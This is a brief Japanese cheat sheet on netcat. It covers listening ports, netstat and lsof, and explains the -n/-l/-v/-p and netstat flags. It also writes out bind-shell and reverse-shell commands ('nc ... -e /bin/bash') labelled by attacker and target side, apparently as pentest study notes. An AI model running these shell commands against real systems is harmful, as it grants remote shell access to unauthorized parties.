# How to Use Netcat

```bash
//netcatdでポート5555で接続を待ち受ける
nc -nlvp 5555

//接続待ちのポートを調べる
netstat -atn
lsof -i

//wireshark
sudo wireshark

//netcatでターゲットに接続する
nc $IP 5555


//Bind shell
//接続側：netcatをサーバーとして動作させて、接続したらシェルを操作できるようにする
nc -nlvp 5555 -e /bin/bash

//攻撃側から接続する
nc $IP 5555


//Reverse shell
//攻撃側
nc -nlvp 5555

//接続側
nc $IP 5555 -e /bin/bash


//side note
2. -n

ホスト名解決を無効化します。

ホスト名（例: example.com）をIPアドレスに変換しない。

これにより、速度が向上し、DNSに依存しない接続が可能になります。


3. -l

リスニングモードを有効化します。

他のデバイスが接続してくるのを待機します。


4. -v

冗長モード（verbose mode）を有効化。

詳細な情報を出力します（例: 接続元のIPアドレスやポート番号）。


5. -p

使用するポート番号を指定します。

この場合は「5555」番ポートをリッスンします。



1. netstat

ネットワーク統計情報を表示するツール。

接続中のソケット、リスニング中のポート、ルーティングテーブルなどを確認できます。



2. -a

すべてのソケットを表示します。

リスニング中のポート（待機中の接続）と、確立済みの接続が両方表示されます。




3. -t

TCPプロトコルの接続のみを表示します。

UDP接続は表示されません。




4. -n

IPアドレスとポート番号を数値形式で表示します。

ホスト名やサービス名に変換しないため、結果の表示が高速です。
